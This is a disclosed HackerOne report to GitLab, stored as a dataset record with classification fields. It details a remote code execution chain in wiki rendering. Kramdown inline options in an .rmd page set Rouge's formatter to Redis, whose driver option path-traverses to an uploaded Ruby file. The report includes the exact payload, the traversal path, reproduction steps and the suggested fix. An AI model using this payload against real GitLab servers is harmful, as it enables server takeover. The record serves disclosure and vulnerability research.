{
  "reported_to": "GitLab",
  "reported_by": "vakzz ",
  "title": "RCE via unsafe inline Kramdown options when rendering certain Wiki pages",
  "content": "\nSummary\nWhen rendering wiki content with certain extensions such as .rmd, render_wiki_content will call other_markup_unsafe which will end up calling GitHub::Markup.render from the github-markup gem. Files with any extension can be uploaded by checking out the wiki with git, commiting the files and pushing the changes back.\nSince kramdown is loaded, this will end up using it for the markdown parser by calling Kramdown::Document.new(content).to_html\nKramdown has a special extension that allows for options to be set inline, the example they give is: {::options auto_ids=\"false\" footnote_nr=\"5\" syntax_highlighter_opts=\"{line_numbers: true\\}\" /}\nThe default syntax highlighter is rouge which has an option formatter that can be set via syntax_highlighter_opts in the inline options. This option gets used by formatter_class:\nCode 1.01 KiB\n1  def self.call(converter, text, lang, type, call_opts)\n2      opts = options(converter, type)\n3      call_opts[:default_lang] = opts[:default_lang]\n4      return nil unless lang || opts[:default_lang] || opts[:guess_lang]\n5\n6      lexer = ::Rouge::Lexer.find_fancy(lang || opts[:default_lang], text)\n7      return nil if opts[:disable] || !lexer || (lexer.tag == \"plaintext\" && !opts[:guess_lang])\n8\n9      opts[:css_class] ||= 'highlight' # For backward compatibility when using Rouge 2.0\n10      formatter = formatter_class(opts).new(opts)\n11      formatter.format(lexer.lex(text))\n12    end\n13\n14  def self.formatter_class(opts = {})\n15      puts \"formatter\"\n16      puts opts[:formatter]\n17      case formatter = opts[:formatter]\n18      when Class\n19        formatter\n20      when /\\A[[:upper:]][[:alnum:]_]*\\z/\n21        ::Rouge::Formatters.const_get(formatter)\n22      else\n23        # Available in Rouge 2.0 or later\n24        ::Rouge::Formatters::HTMLLegacy\n25      end\n26    rescue NameError\n27      # Fallback to Rouge 1.x\n28      ::Rouge::Formatters::HTML\n29    end\nSo this a means that ::Rouge::Formatters.const_get(opts[:formatter]).new(opts) will be called, where opts is controllable via the inline options to kramdown, allowing ruby objects to be initialised so long as the validation of /\\A[[:upper:]][[:alnum:]_]*\\z/ passes. The validation slightly restricts things, but pretty much any class without a namespace (:: is not allowed) can be created. For example (the two ~~ should have an extra ~ but it's messing up the h1 formatting so will need to add it):\nCode 180 Bytes\n1{::options auto_ids=\"false\" footnote_nr=\"5\" syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{formatter: CSV, line_numbers: true\\}\" /}\n2\n3~~ ruby\n4    def what?\n5      42\n6    end\n7~~\nWill result in a CSV object being created and then it will error with private method 'format' called for #<CSV:0x00007fe4df7e26d0> as it tries to use this as the formatter.\nOne of the loaded classes is gitlab is Redis from redis-rb which has an option driver that is used to load the driver class:\nhttps://github.com/redis/redis-rb/blob/v4.1.3/lib/redis/client.rb#L507\nCode 522 Bytes\n1    def _parse_driver(driver)\n2      driver = driver.to_s if driver.is_a?(Symbol)\n3\n4      if driver.kind_of?(String)\n5        begin\n6          require_relative \"connection/#{driver}\"\n7        rescue LoadError, NameError => e\n8          begin\n9            require \"connection/#{driver}\"\n10          rescue LoadError, NameError => e\n11            raise RuntimeError, \"Cannot load driver #{driver.inspect}: #{e.message}\"\n12          end\n13        end\n14\n15        driver = Connection.const_get(driver.capitalize)\n16      end\n17\n18      driver\n19    end\nAs both require_relative and require allow for directory traversal, supplying a driver option such as ../../../../../../../../../../tmp/a.rb will cause that file to be evaluated.\nOne of the ways to get a file to a known location in gitlab is to attach a file in the description of a snippet. When attaching, a markdown link will be created similar to: [file.rb](/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb). The default gitlab_rails['uploads_directory'] is /var/opt/gitlab/gitlab-rails/uploads meaning the final file location will be /var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb.\nCombining all of of this, we can create the following .rmd file to execute our payload (add ~ to both of the ~~):\nCode 282 Bytes\n1{::options auto_ids=\"false\" footnote_nr=\"5\" syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb\\}\" /}\n2\n3~~ ruby\n4def what?\n5  42\n6end\n7~~\nSteps to reproduce\nCreate a new snippet with any title and file\nputs \"hello from ruby\"\n`echo vakzz was here > /tmp/vakzz`\n```\nMake note of the upload path: /uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\nCreate a new project\nClick Wiki and create a default home page\nHit Clone repository to get the clone command\n{::options syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\\}\" /}\n\nPush the changes git add -A . && git commit -m \"page1.rmd\" && git push\nRefresh the wiki, there should now be page1 of the right hand side\nClick and load page1\nwrong constant name ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\n\nroot@gitlab-docker:~# cat /tmp/vakzz\n\nImpact\nAllows any user with push access to a wiki to execute arbitrary ruby code.\nExamples\nExample page using the inline options to change the highlighter from rouge to minted - https://gitlab.com/vakzz-h1/kramdown-wiki/-/wikis/page1\nWhat is the current bug behavior?\nInline options can be set when rendering kramdown documents\nWhat is the expected correct behavior?\nforbidden_inline_options could be use to disable the dangerous inline options - https://kramdown.gettalong.org/options.html\nOutput of checks\nResults of GitLab environment info\nCode 850 Bytes\n1System information\n2System:\n3Proxy:\t\tno\n4Current User:\tgit\n5Using RVM:\tno\n6Ruby Version:\t2.7.2p137\n7Gem Version:\t3.1.4\n8Bundler Version:2.1.4\n9Rake Version:\t13.0.3\n10Redis Version:\t6.0.10\n11Git Version:\t2.29.0\n12Sidekiq Version:5.2.9\n13Go Version:\tunknown\n14\n15GitLab information\n16Version:\t13.9.1-ee\n17Revision:\t8ae438629fa\n18Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n19DB Adapter:\tPostgreSQL\n20DB Version:\t12.5\n21URL:\t\thttp://gitlab-docker.local\n22HTTP Clone URL:\thttp://gitlab-docker.local/some-group/some-project.git\n23SSH Clone URL:\tgit@gitlab-docker.local:some-group/some-project.git\n24Elasticsearch:\tno\n25Geo:\t\tno\n26Using LDAP:\tno\n27Using Omniauth:\tyes\n28Omniauth Providers:\n29\n30GitLab Shell\n31Version:\t13.16.1\n32Repository storage paths:\n33- default: \t/var/opt/gitlab/git-data/repositories\n34GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n35Git:\t\t/opt/gitlab/embedded/bin/git\nImpact\nAllows any user with push access to a wiki to execute arbitrary ruby code.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 20000,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1618954500,
  "report_url": "https://hackerone.com/reports/1125425",
  "is_multi_component": false,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a new snippet with any title and file containing Ruby code (e.g., `puts \"hello from ruby\"` or `echo vakzz was here > /tmp/vakzz`)"
    ],
    [
      2,
      "Note the upload path of the snippet file (e.g., `/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb`)"
    ],
    [
      3,
      "Create a new project and navigate to its Wiki section"
    ],
    [
      4,
      "Clone the Wiki repository locally"
    ],
    [
      5,
      "Create a new .rmd file with malicious Kramdown inline options pointing to the snippet file (e.g., `{::options syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb}\" /}`)"
    ],
    [
      6,
      "Commit and push the changes to the Wiki repository"
    ],
    [
      7,
      "Access the uploaded .rmd file in the Wiki to trigger the payload execution"
    ]
  ],
  "vuln_description": "The vulnerability allows arbitrary Ruby code execution via unsafe inline Kramdown options when rendering Wiki pages. An attacker can exploit this by uploading a malicious .rmd file that leverages Kramdown's inline options to load and execute arbitrary Ruby code through the Rouge syntax highlighter's formatter option and Redis driver's directory traversal.",
  "reason": "This vulnerability requires deep understanding of multiple components: Kramdown's inline options, Rouge syntax highlighter's formatter selection, Redis driver's directory traversal, and GitLab's file upload paths. The attacker must chain these components together in a non-obvious way to achieve code execution.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves manipulating inline Kramdown options in wiki pages to achieve RCE, which is a server-side execution flaw rather than an authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, which doesn't apply to this case since the exploit doesn't involve crossing user/resource authorization boundaries but rather exploits a parsing vulnerability in the markdown rendering process.",
    "is_detectable": false
  }
}